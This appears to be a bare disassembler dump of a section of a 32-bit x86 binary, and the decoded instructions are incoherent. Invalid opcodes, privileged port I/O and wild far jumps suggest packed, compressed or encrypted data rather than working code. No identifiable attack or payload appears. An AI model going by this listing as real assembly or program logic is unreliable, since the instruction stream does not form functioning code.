  41b3b4:	in     eax,0xcf
  41b3b6:	lahf   
  41b3b7:	dec    edi
  41b3b8:	ds icebp 
  41b3ba:	in     eax,dx
  41b3bb:	fwait
  41b3bc:	mov    WORD PTR [eax-0x4b7dc59d],fs
  41b3c2:	popf   
  41b3c3:	mov    cl,0x60
  41b3c5:	xor    BYTE PTR [esi-0x17b092bd],0xd1
  41b3cc:	push   ebp
  41b3cd:	mov    BYTE PTR [ebx],ch
  41b3cf:	push   eax
  41b3d0:	push   ecx
  41b3d1:	(bad)  
  41b3d2:	xor    DWORD PTR [eax+ebx*8],ebp
  41b3d5:	cdq    
  41b3d6:	mov    eax,0xda5619ee
  41b3db:	js     0x41b40e
  41b3dd:	xor    DWORD PTR [esi+0x79],esi
  41b3e0:	inc    ebp
  41b3e1:	stos   DWORD PTR es:[edi],eax
  41b3e2:	test   al,0x7b
  41b3e4:	imul   esi,esi,0xd43252f0
  41b3ea:	xor    BYTE PTR [ebx-0x52f3015e],ch
  41b3f0:	xchg   DWORD PTR [ebp-0x8],eax
  41b3f3:	push   ebx
  41b3f4:	shr    BYTE PTR [esp+esi*8-0x19],0xed
  41b3f9:	aad    0xf6
  41b3fb:	add    edx,DWORD PTR [ecx-0x7b]
  41b3fe:	mov    edx,0x2a747022
  41b403:	jge    0x41b448
  41b405:	xor    ah,bh
  41b407:	or     esp,DWORD PTR ds:0x544b469
  41b40d:	(bad)
  41b411:	inc    eax
  41b412:	sub    dl,BYTE PTR [ebp-0x2dbd9294]
  41b418:	int3   
  41b419:	arpl   WORD PTR [ebx+0x659cdea8],ax
  41b41f:	ret    0xde98
  41b422:	dec    esp
  41b423:	jmp    0x41b427
  41b425:	fldcw  WORD PTR [ebp-0x2d]
  41b428:	out    dx,eax
  41b429:	jge    0x41b49c
  41b42b:	cmp    eax,0x68e68a74
  41b430:	ret    0x9811
  41b433:	and    ch,cl
  41b435:	xor    BYTE PTR [ebp+0x5d78c5d9],ah
  41b43b:	stos   BYTE PTR es:[edi],al
  41b43c:	in     al,dx
  41b43d:	adc    edi,esi
  41b43f:	lods   eax,DWORD PTR ds:[esi]
  41b440:	xchg   edx,eax
  41b441:	jns    0x41b3ec
  41b443:	inc    edx
  41b444:	adc    bl,BYTE PTR [edx]
  41b446:	jae    0x41b48f
  41b448:	fistp  WORD PTR [esi-0x67]
  41b44b:	push   esi
  41b44c:	mov    ecx,0xe833d25e
  41b451:	aad    0x49
  41b453:	(bad)  
  41b454:	lahf   
  41b455:	mov    ah,0x65
  41b457:	jne    0x41b4ba
  41b459:	test   BYTE PTR ds:[eax-0x369fd572],dh
  41b460:	mov    ds:0x70232b56,eax
  41b465:	outs   dx,BYTE PTR ds:[esi]
  41b466:	add    al,0x6c
  41b468:	sub    al,0xf0
  41b46a:	mov    eax,edi
  41b46c:	push   ss
  41b46d:	jle    0x41b476
  41b46f:	jmp    0x1854:0x48fcbc12
  41b476:	lock fdivr QWORD PTR [ecx+0x28]
  41b47a:	ja     0x41b424
  41b47c:	pop    esp
  41b47d:	test   al,0xc
  41b47f:	lds    eax,FWORD PTR [ebx]
  41b481:	pop    ds
  41b482:	dec    ecx
  41b483:	mov    bh,0xab
  41b485:	jns    0x41b4b2
  41b487:	(bad)  
  41b488:	xor    BYTE PTR [edi-0x78],bl
  41b48b:	popa   
  41b48c:	push   ss
  41b48d:	adc    DWORD PTR [edi],edx
  41b48f:	sbb    DWORD PTR [ebx+0x18],0x6c
  41b493:	hlt    
  41b494:	dec    eax
  41b495:	test   eax,0xe299e6e4
  41b49a:	sub    eax,0x62328343
  41b49f:	jne    0x41b4af
  41b4a1:	imul   esp,DWORD PTR [esi+ebp*1],0x39e0ed22
  41b4a8:	les    edi,FWORD PTR [edx]
  41b4aa:	add    eax,DWORD PTR [edx-0x26758137]
  41b4b0:	jl     0x41b48c
  41b4b2:	mov    ah,0x4b
  41b4b4:	pop    ss
  41b4b5:	and    eax,0xdeca129c
  41b4ba:	fld    DWORD PTR [eax+0x1532b4c7]
  41b4c0:	ins    DWORD PTR es:[edi],dx
  41b4c1:	iret   
  41b4c2:	pop    ebx
  41b4c3:	add    ecx,DWORD PTR [ebp-0xb]
  41b4c6:	dec    esi
  41b4c7:	and    bh,BYTE PTR [ebp+0x3d]
  41b4ca:	adc    DWORD PTR [eax-0x53],ecx
  41b4cd:	(bad)  
  41b4ce:	dec    esp
  41b4cf:	inc    esp
  41b4d0:	imul   eax,DWORD PTR es:[edi+0x3c2171fe],0x5
  41b4d8:	inc    ecx
  41b4d9:	es in  eax,0xc
  41b4dc:	jmp    0x8b5599c
  41b4e1:	adc    esi,esi
  41b4e3:	sbb    BYTE PTR [ebp+0x75b8f91],ch
  41b4e9:	cmp    BYTE PTR [edi-0x51dcb465],al
  41b4ef:	mov    al,ds:0x9dc28640
  41b4f4:	and    al,0x60
  41b4f6:	xchg   edx,eax
  41b4f7:	xchg   ecx,edi
  41b4f9:	mov    edi,0x53668053
  41b4fe:	inc    ecx
  41b4ff:	out    dx,al
  41b500:	aaa    
  41b501:	sbb    BYTE PTR [ebx],dh
  41b503:	sub    al,0x24
  41b505:	cli    
  41b506:	ss xchg edx,eax
  41b508:	mov    dl,0xf8
  41b50a:	scas   eax,DWORD PTR es:[edi]
  41b50b:	jmp    0xec20:0xee1c32df
  41b512:	icebp  
  41b513:	ret    
  41b514:	pop    es
  41b515:	pop    edi
  41b516:	outs   dx,DWORD PTR ds:[esi]
  41b517:	ins    DWORD PTR es:[edi],dx
  41b518:	mov    edx,0x2a6159eb
  41b51d:	(bad)  
  41b51f:	and    al,0xc2
  41b521:	ins    BYTE PTR es:[edi],dx
  41b522:	mov    ah,0xe5
  41b524:	sub    ebx,DWORD PTR [eax-0x737a14a8]
  41b52a:	cdq    
  41b52b:	mov    ch,0x57
  41b52d:	add    BYTE PTR [esi],dh
  41b52f:	sub    dh,ah
  41b531:	jno    0x41b590
  41b533:	mov    ah,0x8e
  41b535:	mov    bl,BYTE PTR [eax]
  41b537:	push   0xc71f2d88
  41b53c:	cli    
  41b53d:	pop    ebx
  41b53e:	jbe    0x41b59a
  41b540:	dec    eax
  41b541:	int3   
  41b542:	jle    0x41b528
  41b544:	fst    QWORD PTR [edi+0x6b]
  41b547:	push   ds
  41b548:	pop    ds
  41b549:	sbb    edi,DWORD PTR [esp+edi*2-0x758750bf]
  41b550:	sub    cl,ah
  41b552:	loop   0x41b51d
  41b554:	xchg   edx,eax
  41b555:	dec    edx
  41b556:	fstp   st(6)
  41b558:	xchg   BYTE PTR [edx-0x3c],bl
  41b55b:	sbb    BYTE PTR [esi+0x70c57ba2],cl
  41b561:	repz mov bl,0x57
  41b564:	xor    edi,DWORD PTR [ebx+0x6b]
  41b567:	nop
  41b568:	sub    BYTE PTR [ebp+0x7a5636ea],dh
  41b56e:	xchg   edx,eax
  41b56f:	ss call 0x1699:0x6892b583
  41b577:	xchg   ebx,eax
  41b578:	(bad)  
  41b579:	fcmovbe st,st(4)
  41b57b:	mov    al,ds:0x4a956700
  41b580:	sub    ecx,DWORD PTR [ebp+0xe384f0]
  41b586:	xchg   esp,eax
  41b587:	add    al,0xe7
  41b589:	jnp    0x41b5b1
  41b58b:	or     bl,BYTE PTR [ebx]
  41b58d:	ficomp DWORD PTR [ecx+ebp*1]
  41b590:	js     0x41b5a2
  41b592:	add    al,0xe9
  41b594:	sub    ch,BYTE PTR [esi]
  41b596:	mov    esp,DWORD PTR ss:[esi+ebp*1]
  41b59a:	out    0xd7,al
  41b59c:	(bad)  
  41b59d:	cmp    esi,DWORD PTR [edi+eiz*8+0x34]
  41b5a1:	dec    edx
  41b5a2:	into   
  41b5a3:	popa   
  41b5a4:	bound  ebx,QWORD PTR [ebp+0x2a36e07a]
  41b5aa:	xor    ebx,edx
  41b5ac:	iret   
  41b5ad:	aam    0x3
  41b5af:	mov    al,ds:0x1999e52c
  41b5b4:	xchg   ecx,eax
  41b5b5:	cmp    DWORD PTR [ecx],edi
  41b5b7:	adc    DWORD PTR [edi+0x6d],eax
  41b5ba:	or     BYTE PTR ds:0xe812e845,ch
  41b5c0:	gs in  eax,0x1b
  41b5c3:	sub    al,0xcd
  41b5c5:	ds mov bl,0x1f
  41b5c8:	leave  
  41b5c9:	gs mov ebp,0x4ffff4dc
  41b5cf:	and    BYTE PTR [edi-0x6880536a],ah
  41b5d5:	xor    dl,ch
  41b5d7:	scas   eax,DWORD PTR es:[edi]
  41b5d8:	fimul  WORD PTR [esi-0x48]
  41b5db:	stos   BYTE PTR es:[edi],al
  41b5dc:	ror    ebx,1
  41b5de:	sbb    eax,0xb2d83e7f
  41b5e3:	sbb    al,0xa5
  41b5e5:	add    eax,edx
  41b5e7:	pop    ebx
  41b5e8:	mov    ebx,0x3d2be518
  41b5ed:	scas   eax,DWORD PTR es:[edi]
  41b5ee:	rcr    DWORD PTR [ebx],cl
  41b5f0:	jmp    0xe93f:0x16c8eb9e
  41b5f7:	loopne 0x41b59f
  41b5f9:	dec    eax
  41b5fa:	mov    bl,0x9d
  41b5fc:	add    al,0x6a
  41b5ff:	xor    BYTE PTR [edx-0xb99f7b2],dl
  41b605:	or     cl,dh
  41b607:	jecxz  0x41b621
  41b609:	mov    al,0x1d
  41b60b:	(bad)  
  41b60d:	call   0x4e40:0xaec9b70a
  41b614:	add    al,BYTE PTR [edi]
  41b616:	sti    
  41b617:	aam    0x58
  41b619:	push   edi
  41b61a:	xchg   esi,eax
  41b61b:	fild   WORD PTR [ebp-0x6b88a7b6]
  41b621:	mov    ah,0xb9
  41b623:	fs sahf 
  41b625:	add    ecx,DWORD PTR [edx+0x9]
  41b628:	data16 in al,dx
  41b62a:	sbb    eax,0x38f76fcb
  41b62f:	shr    dh,1
  41b631:	and    al,0x8e
  41b633:	push   ss
  41b634:	push   ecx
  41b635:	jbe    0x41b5fa
  41b637:	push   edx
  41b638:	cs jno 0x41b60e
  41b63b:	mov    bl,0xc9
  41b63d:	xchg   edi,eax
  41b63e:	mov    ecx,0x16600dee
  41b643:	adc    DWORD PTR [ecx-0x5c4fa015],ecx
  41b649:	rol    BYTE PTR [edx],0x32
  41b64c:	or     eax,0x792d51a0
  41b652:	rcl    BYTE PTR [edx],cl
  41b654:	shr    DWORD PTR [esi+0x43143790],cl
  41b65a:	push   ss
  41b65b:	aas    
  41b65c:	add    dh,BYTE PTR [ecx+ebx*8-0x5d8c1884]
  41b663:	push   ebp
  41b664:	mov    bh,0x5e
  41b666:	cmp    cl,BYTE PTR [edi+eiz*4+0x32245c35]
  41b66d:	nop
  41b66e:	or     bh,BYTE PTR [eax]
  41b670:	ja     0x41b6a8
  41b672:	mov    ds:0x69fc96a,al
  41b677:	mov    ch,0x8c
  41b679:	mov    ds:0xe64212e4,eax
  41b67e:	(bad)  
  41b67f:	push   esp
  41b680:	das    
  41b681:	ror    bl,cl
  41b683:	dec    ebx
  41b684:	cmp    ebp,DWORD PTR [eax+0x62]
  41b687:	xor    bl,bh
  41b689:	or     ebp,DWORD PTR [ecx-0x6a]
  41b68c:	push   eax
  41b68d:	dec    esp
  41b68e:	retf   
  41b68f:	mov    edi,ds
  41b691:	aaa    
  41b692:	aas    
  41b693:	rcr    DWORD PTR [edi+0x5faabbd6],0xe4
  41b69a:	sbb    eax,0xc5eb6744
  41b69f:	pop    ss
  41b6a0:	sbb    ecx,DWORD PTR [ebp+ebp*8-0x54]
  41b6a4:	or     eax,0x3c648af2
  41b6a9:	in     al,0xfa
  41b6ab:	and    ebp,edi
  41b6ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6ae:	jne    0x41b6cc
  41b6b0:	fist   WORD PTR [ebx+0x421825b4]
  41b6b6:	xchg   esi,eax
  41b6b7:	mov    ds:0xdea57bd5,eax
  41b6bc:	jle    0x41b6fd
  41b6be:	jbe    0x41b6ca
  41b6c0:	dec    ebx
  41b6c1:	sbb    al,0xb6
  41b6c3:	test   ebp,ebx
  41b6c5:	test   al,0xbd
  41b6c7:	out    dx,eax
  41b6c8:	add    BYTE PTR [ecx-0x75],dh
  41b6cb:	push   ss
  41b6cc:	pop    ds
  41b6cd:	and    DWORD PTR [ebx+0x22],edi
  41b6d0:	aas    
  41b6d1:	mov    esp,0x8eebaa3c
  41b6d6:	or     al,0xc8
  41b6d8:	mov    eax,0x6600afcf
  41b6dd:	xchg   esi,eax
  41b6de:	sub    dh,0xa3
  41b6e1:	retf   
  41b6e2:	stos   DWORD PTR es:[edi],eax
  41b6e3:	aam    0x77
  41b6e5:	aam    0x24
  41b6e7:	cs inc esp
  41b6e9:	jbe    0x41b728
  41b6eb:	push   0xffffffaa
  41b6ed:	sub    DWORD PTR [eax],esp
  41b6ef:	or     BYTE PTR [esi+ebp*4-0x7cfee56],ch
  41b6f6:	outs   dx,BYTE PTR ds:[esi]
  41b6f7:	(bad)  
  41b6f8:	pushf  
  41b6f9:	mov    bl,0x34
  41b6fb:	mov    eax,ds:0xea3139bc
  41b700:	xor    dh,0xfc
  41b703:	out    dx,eax
  41b704:	(bad)  
  41b705:	pop    ss
  41b706:	inc    ecx
  41b707:	in     al,0x38
  41b709:	inc    ebx
  41b70a:	dec    esp
  41b70b:	int3   
  41b70c:	push   0xcbc3557d
  41b711:	ja     0x41b75a
  41b713:	fwait
  41b714:	jecxz  0x41b6d6
  41b716:	fbld   TBYTE PTR [esi-0x2d]
  41b719:	cmp    BYTE PTR [eax+esi*8+0x61],ch
  41b71d:	jecxz  0x41b777
  41b71f:	xchg   BYTE PTR [eax],bh
  41b721:	jmp    0xac2d4a7e
  41b726:	fnstcw WORD PTR [esi]
  41b728:	xchg   BYTE PTR [eax+0x54f2c695],bl
  41b72e:	push   ss
  41b72f:	mov    eax,ds:0xeeb62a24
  41b734:	dec    ebp
  41b735:	nop
  41b736:	and    al,0xcc
  41b738:	xlat   BYTE PTR ds:[ebx]
  41b739:	push   es
  41b73a:	popa   
  41b73b:	scas   eax,DWORD PTR es:[edi]
  41b73c:	mov    bh,0xcb
  41b73e:	cmp    dl,BYTE PTR [edi+0x70]
  41b741:	js     0x41b77f
  41b743:	pop    ebx
  41b744:	adc    ah,BYTE PTR [esi-0x3f]
  41b747:	jo     0x41b7ad
  41b749:	push   ss
  41b74a:	jmp    0xbfc5587c
  41b74f:	and    cl,BYTE PTR [edi-0x2d484846]
  41b755:	popf   
  41b756:	dec    ecx
  41b757:	mov    esi,0x2268a2b9
  41b75c:	xor    al,0x86
  41b75e:	push   ebp
  41b75f:	outs   dx,BYTE PTR ds:[esi]
  41b760:	hlt    
  41b761:	sysexit 
  41b763:	and    eax,DWORD PTR [esi]
  41b765:	shl    BYTE PTR [ecx],1
  41b767:	add    ebp,eax
  41b769:	lods   al,BYTE PTR ds:[esi]
  41b76a:	scas   eax,DWORD PTR es:[edi]
  41b76b:	inc    esp
  41b76c:	xchg   BYTE PTR [ecx-0xbf9a608],dh
  41b772:	out    0x1d,al
  41b774:	jmp    0x41b752
  41b776:	and    eax,0x2efc14a7
  41b77b:	lods   al,BYTE PTR ds:[esi]
  41b77c:	ror    DWORD PTR [edx],cl
  41b77e:	pop    edi
  41b77f:	cmp    dh,BYTE PTR [edi-0x14]
  41b782:	fisttp QWORD PTR [edi+0x3a]
  41b785:	adc    al,0x15
  41b787:	je     0x41b7b4
  41b789:	mov    edi,0x44ee7c46
  41b78e:	mov    ebp,0xcc7d2b9b
  41b793:	mov    BYTE PTR [edx-0x68664aa5],bh
  41b799:	out    dx,eax
  41b79a:	pop    ecx
  41b79b:	pop    ds
  41b79c:	jmp    0x4b9dabd0
  41b7a1:	pop    ss
  41b7a2:	pop    ebx
  41b7a3:	popa   
  41b7a4:	pusha  
  41b7a5:	sub    edi,DWORD PTR [eax+0x2098610b]
  41b7ab:	iret   
  41b7ac:	adc    eax,0xe269ad90
  41b7b1:	sub    al,0xf4
  41b7b3:	sahf   
  41b7b4:	(bad)
  41b7b7:	xor    ch,BYTE PTR [edi+0x514add83]
  41b7bd:	mov    eax,ds:0x5942b560
  41b7c2:	gs mov ecx,0xdfaf9fb0
  41b7c8:	sar    ecx,0x13
  41b7cb:	cmp    esp,DWORD PTR [edi]
  41b7cd:	adc    bl,BYTE PTR [esi*8-0x4bcebf23]
  41b7d4:	xor    ah,dl
  41b7d6:	mov    ebp,0xd56b5e81
  41b7db:	sub    al,0x4f
  41b7dd:	add    eax,DWORD PTR [edx-0x758a3c9]
  41b7e3:	inc    esp
  41b7e4:	arpl   WORD PTR [eax+0x3a],dx
  41b7e7:	ja     0x41b856
  41b7e9:	test   DWORD PTR [ebp+0x37f9b8f8],ebp
  41b7ef:	addr16 and al,0x77
  41b7f2:	pop    ss
  41b7f3:	mov    eax,ds:0x8037089e
  41b7f8:	dec    esp
  41b7f9:	dec    edx
  41b7fa:	jb     0x41b783
  41b7fc:	fimul  WORD PTR [esi-0x4f6eb95c]
  41b802:	mov    ah,0xf0
  41b804:	fnstenv [esi+edx*8-0x71]
  41b808:	jo     0x41b865
  41b80a:	popa   
  41b80b:	xchg   ecx,eax
  41b80c:	bound  edi,QWORD PTR [esi-0x57]
  41b80f:	js     0x41b802
  41b811:	sbb    BYTE PTR ds:0x2cbb138c,bl
  41b817:	push   esi
  41b818:	aad    0x45
  41b81a:	fidivr DWORD PTR [edx]
  41b81c:	imul   esp,DWORD PTR [ebx+ebp*2+0x5b5e6bcd],0x99ba58de
  41b827:	push   eax
  41b828:	or     eax,0x57aaffec
  41b82d:	jl     0x41b837
  41b82f:	jmp    0xc9db9b1d
  41b834:	lods   al,BYTE PTR ds:[esi]
  41b835:	or     cl,BYTE PTR [ecx]
  41b837:	cmc    
  41b838:	ss dec eax
  41b83a:	push   ebp
  41b83b:	pop    ebx
  41b83c:	call   0x98ac02bb
  41b841:	dec    ebp
  41b842:	or     al,0x7
  41b844:	sar    BYTE PTR [ebx],cl
  41b846:	or     DWORD PTR [edi],ecx
  41b848:	sbb    esi,ebx
  41b84a:	jmp    0x2d4147ae
  41b84f:	(bad)  
  41b850:	dec    ebx
  41b851:	dec    edi
  41b852:	add    eax,0xa96f4dc2
  41b857:	rcl    DWORD PTR [ecx+0x6123ef18],1
  41b85d:	int    0x2b
  41b85f:	icebp  
  41b860:	pop    edx
  41b861:	xchg   esp,eax
  41b862:	popf   
  41b863:	repz lock sahf 
  41b866:	sub    eax,0xd18278a
  41b86b:	pop    edi
  41b86c:	pop    edx
  41b86d:	mov    BYTE PTR [edx],0xc6
  41b870:	push   eax
  41b871:	test   DWORD PTR [ecx],ebp
  41b873:	es jle 0x41b89e
  41b876:	jnp    0x41b835
  41b878:	pop    ecx
  41b879:	mov    BYTE PTR [ecx],bl
  41b87b:	jnp    0x41b81e
  41b87d:	and    eax,DWORD PTR gs:[ecx-0xd7da02b]
  41b884:	mov    ebp,0xe24230de
  41b889:	lods   al,BYTE PTR ds:[esi]
  41b88a:	and    al,BYTE PTR [ebx+ecx*4]
  41b88d:	push   ebp
  41b88e:	lahf   
  41b88f:	out    0xd5,al
  41b891:	mov    ch,0xd9
  41b893:	and    ebp,DWORD PTR [esi+eiz*1]
  41b896:	mov    ch,0xb0
  41b898:	in     ax,dx
  41b89a:	pop    ecx
  41b89b:	dec    ebx
  41b89c:	shl    cl,0x63
  41b89f:	aam    0x6b
  41b8a1:	dec    edi
  41b8a2:	daa    
  41b8a3:	div    BYTE PTR [esi]
  41b8a5:	mov    gs,WORD PTR [ecx]
  41b8a7:	pop    esi
  41b8a8:	test   BYTE PTR [ebp+esi*1-0x4062f6e1],0x57
  41b8b0:	ror    DWORD PTR [ebp-0x49],cl
  41b8b3:	ret    0xbf9
  41b8b6:	loope  0x41b925
  41b8b8:	mov    ah,0xe2
  41b8ba:	jl     0x41b849
  41b8bc:	dec    edi
  41b8bd:	pop    DWORD PTR [edi+0x322afcd6]
  41b8c3:	xlat   BYTE PTR ds:[ebx]
  41b8c4:	mov    edx,0xb7bf27d6
  41b8c9:	mov    al,ds:0x715fc1d6
  41b8ce:	imul   esi,DWORD PTR [edi+esi*4],0xffffffa9
  41b8d2:	adc    ah,BYTE PTR [esp+edi*2-0x48]
  41b8d6:	add    BYTE PTR [esi+0x44c7b4e6],dl
  41b8dc:	pop    ss
  41b8dd:	jge    0x41b900
  41b8df:	jbe    0x41b897
  41b8e1:	shl    DWORD PTR [edi-0x13],1
  41b8e4:	arpl   WORD PTR [ebp+0x4b588345],sp
  41b8ea:	mov    al,ds:0xd0f90b2b
  41b8ef:	xchg   esi,eax
  41b8f0:	pop    esp
  41b8f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8f2:	imul   eax,esp,0xa8b19b53
  41b8f8:	mov    al,BYTE PTR [ecx]
  41b8fa:	pop    ss
  41b8fb:	rcr    BYTE PTR [esi-0x1c5003e4],0x74
  41b902:	in     al,dx
  41b903:	out    dx,eax
  41b904:	inc    edx
  41b905:	mov    esp,0x7e87c338
  41b90a:	jmp    0x41b892
  41b90c:	(bad)  
  41b90d:	call   ebp
  41b90f:	ret    
  41b910:	nop
  41b911:	jae    0x41b922
  41b913:	std    
  41b914:	mov    ebp,0x911bb717
  41b919:	(bad)  
  41b91a:	mov    edx,0xe25ab127
  41b91f:	bound  edx,QWORD PTR [ebx]
  41b921:	mov    BYTE PTR [edx],bh
  41b923:	loopne 0x41b97a
  41b925:	iret   
  41b926:	jnp    0x41b97d
  41b928:	add    dl,BYTE PTR [edi-0x76]
  41b92b:	dec    esp
  41b92c:	push   eax
  41b92d:	mov    cs,ecx
  41b92f:	test   eax,0xee10ed55
  41b934:	add    DWORD PTR [edi],edx
  41b936:	dec    ebp
  41b937:	mov    al,bl
  41b939:	mov    bh,BYTE PTR [edx]
  41b93b:	jmp    0xc03a:0x8b38b253
  41b942:	mov    ebp,DWORD PTR [edi+0x65]
  41b945:	jmp    0x253f625f
  41b94a:	imul   edx,DWORD PTR [edx],0x2c918a98
  41b950:	ficom  WORD PTR [ebx]
  41b952:	xchg   ebx,eax
  41b953:	pop    esi
  41b954:	sar    BYTE PTR [ebp+0x13],0xc5
  41b958:	inc    edx
  41b959:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b95a:	mov    ebp,0x38929db6
  41b95f:	xlat   BYTE PTR ds:[ebx]
  41b960:	sbb    DWORD PTR [edi+0x79],ecx
  41b963:	shr    BYTE PTR [esi-0x71d20af1],1
  41b969:	xor    al,0xfc
  41b96b:	and    ebx,DWORD PTR [ebp-0x18]
  41b96e:	stc    
  41b96f:	push   es
  41b970:	out    dx,al
  41b971:	loop   0x41b9ee
  41b973:	ds icebp 
  41b975:	and    eax,0x75e0ee13
  41b97a:	int3   
  41b97b:	xor    eax,0xe6575611
  41b980:	push   es
  41b981:	ja     0x41b98c
  41b983:	jecxz  0x41b9ec
  41b985:	ss jecxz 0x41b926
  41b988:	sbb    ecx,ebp
  41b98a:	mov    cs,WORD PTR [esi+0x7f9f1581]
  41b990:	adc    ah,BYTE PTR [ebp+eiz*1+0x192de518]
  41b997:	leave  
  41b998:	sub    al,BYTE PTR [ebx+eax*2]
  41b99b:	repz push ecx
  41b99d:	dec    edi
  41b99e:	dec    ebp
  41b99f:	cwde   
  41b9a0:	cmc    
  41b9a1:	inc    edi
  41b9a2:	jae    0x41b960
  41b9a4:	mov    ebp,ebp
  41b9a6:	inc    ecx
  41b9a7:	dec    esp
  41b9a8:	nop
  41b9a9:	mov    ah,0x6a
  41b9ab:	daa    
  41b9ac:	mov    ah,0x6c
  41b9ae:	xchg   ebx,eax
  41b9af:	hlt    
  41b9b0:	lea    edx,[esi-0x47]
  41b9b3:	and    edx,ebx
  41b9b5:	test   DWORD PTR [esp+edx*2+0x63],eax
  41b9b9:	push   esi
  41b9ba:	ss xor cl,bl
  41b9bd:	xchg   ecx,eax
  41b9be:	mov    ecx,0x6f0812c4
  41b9c3:	mov    esp,0x78249a13
  41b9c8:	mov    bh,0xd8
  41b9ca:	inc    edi
  41b9cb:	icebp  
  41b9cc:	mov    ebx,0xf554439c
  41b9d1:	fdiv   st(7),st
  41b9d3:	ds cmp cl,cl
  41b9d6:	mov    ds:0x97b46823,al
  41b9db:	in     eax,0xb4
  41b9dd:	mov    dl,0xe5
  41b9df:	add    BYTE PTR [edi],0x4a
  41b9e2:	sahf   
  41b9e3:	ror    ch,1
  41b9e5:	not    BYTE PTR [esi]
  41b9e7:	ret    0xb67a
  41b9ea:	jmp    0x9893417c
  41b9ef:	retf   
  41b9f0:	xchg   BYTE PTR [esp+ecx*8-0x7a],dl
  41b9f4:	mov    dh,0xcd
  41b9f6:	mov    ebp,0xb35bbbe2
  41b9fb:	mov    BYTE PTR [ecx],dl
  41b9fd:	push   esp
  41b9fe:	retf   0x4fed
  41ba01:	sbb    eax,DWORD PTR [esi]
  41ba03:	add    DWORD PTR [edi],edi
  41ba05:	mov    cl,0x1
  41ba07:	pop    ebp
  41ba08:	dec    BYTE PTR [edx-0x6c420cfa]
  41ba0e:	inc    ecx
  41ba0f:	mov    ds:0x9a18f2ed,eax
  41ba14:	dec    ecx
  41ba15:	fldcw  WORD PTR [ebx-0x9]
  41ba18:	mov    cl,0x61
  41ba1a:	cmp    ebp,DWORD PTR [ecx-0x433179c4]
  41ba20:	sub    eax,DWORD PTR [ecx+0x1ec650d]
  41ba26:	shl    eax,0x79
  41ba29:	les    esi,FWORD PTR [edx-0xfc084ad]
  41ba2f:	push   es
  41ba30:	sbb    DWORD PTR [eax],esi
  41ba32:	jae    0x41ba9c
  41ba34:	lods   eax,DWORD PTR ds:[esi]
  41ba35:	dec    edx
  41ba36:	pop    ecx
  41ba37:	sbb    eax,0xffffff86
  41ba3a:	push   edx
  41ba3b:	xor    ebx,DWORD PTR [esi+ebp*2-0x53]
  41ba3f:	ins    DWORD PTR es:[edi],dx
  41ba40:	out    dx,eax
  41ba41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba42:	sbb    DWORD PTR [ebp+0x7d],edi
  41ba45:	xor    eax,0x2ec128a7
  41ba4a:	in     eax,dx
  41ba4b:	mov    edx,DWORD PTR [esi-0x325283ac]
  41ba51:	or     DWORD PTR [esi],esi
  41ba53:	fcomp  QWORD PTR ss:[ebx-0x13]
  41ba57:	or     dh,BYTE PTR [eax+edi*8-0x583006fa]
  41ba5e:	inc    ecx
  41ba5f:	cld    
  41ba60:	loopne 0x41badd
  41ba62:	jl     0x41ba99
  41ba64:	ret    
  41ba65:	outs   dx,DWORD PTR ds:[esi]
  41ba66:	aaa    
  41ba67:	cmp    dh,BYTE PTR [eax+eax*2+0x69]
  41ba6b:	clc    
  41ba6c:	jo     0x41ba62
  41ba6e:	push   es
  41ba6f:	retf   0xe788
  41ba72:	or     DWORD PTR [ebp+eiz*2+0x4559ecf7],eax
  41ba79:	xchg   edi,eax
  41ba7a:	add    BYTE PTR [ebp-0x33],bh
  41ba7d:	inc    edx
  41ba7e:	push   ebx
  41ba7f:	adc    al,0xb5
  41ba81:	xlat   BYTE PTR ds:[ebx]
  41ba82:	jb     0x41ba21
  41ba84:	inc    ebx
  41ba85:	daa    
  41ba86:	ror    eax,1
  41ba88:	jl     0x41ba94
  41ba8a:	clc    
  41ba8b:	xor    dl,cl
  41ba8d:	xchg   edx,eax
  41ba8e:	dec    ebx
  41ba8f:	cld    
  41ba90:	pop    edi
  41ba91:	(bad)  
  41ba92:	lods   eax,DWORD PTR ds:[esi]
  41ba93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba94:	hlt    
  41ba95:	xor    DWORD PTR [esi],esp
  41ba97:	test   eax,0x5e5aa215
  41ba9c:	in     eax,0x26
  41ba9e:	pushf  
  41ba9f:	loopne 0x41ba58
  41baa1:	in     al,0xe
  41baa3:	push   cs
  41baa4:	es pop esi
  41baa6:	lock pop ebx
  41baa8:	pop    es
  41baa9:	(bad)  
  41baaa:	pop    ss
  41baab:	lea    edi,[ebx+0x22755a80]
  41bab1:	dec    edi
  41bab2:	outs   dx,DWORD PTR ds:[esi]
  41bab3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bab4:	into   
  41bab5:	test   al,0xa3
  41bab7:	jle    0x41ba8c
  41bab9:	cmp    al,BYTE PTR [ecx+0x3f34e226]
  41babf:	loope  0x41bb30
  41bac1:	inc    edx
  41bac2:	outs   dx,DWORD PTR cs:[esi]
  41bac4:	enter  0x2f8a,0xc5
  41bac8:	push   es
  41bac9:	mov    eax,0x83ede2ab
  41bace:	mov    ecx,0x42742fd6
  41bad3:	jge    0x41bb04
  41bad5:	lock jp 0x41ba7f
  41bad8:	and    edx,DWORD PTR [ebx-0x6756a6c6]
  41bade:	loope  0x41baf7
  41bae0:	mov    edx,0x75b6a949
  41bae5:	leave  
  41bae6:	dec    eax
  41bae7:	mov    edx,0x1cf928aa
  41baec:	push   ecx
  41baed:	jno    0x41bab8
  41baef:	dec    esp
  41baf0:	or     eax,0x983380ed
  41baf5:	pop    ecx
  41baf6:	test   DWORD PTR [edx],ebp
  41baf8:	xor    ecx,ecx
  41bafa:	(bad)  
  41bafc:	mov    edx,DWORD PTR [edx-0x65]
  41baff:	(bad)  
  41bb01:	mov    ds:0x16f5135d,eax
  41bb06:	mov    edi,0x6ee681d1
  41bb0b:	mov    ecx,0x21861ce7
  41bb10:	ds jp  0x41bb46
  41bb13:	inc    ecx
  41bb14:	call   0xd662:0x656d9afa
  41bb1b:	fild   QWORD PTR [esi]
  41bb1d:	xchg   DWORD PTR [edx],ebp
  41bb1f:	scas   al,BYTE PTR es:[edi]
  41bb20:	inc    ecx
  41bb21:	mov    ds:0x4b09fcc9,al
  41bb27:	ds jns 0x41bace
  41bb2a:	js     0x41bad0
  41bb2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
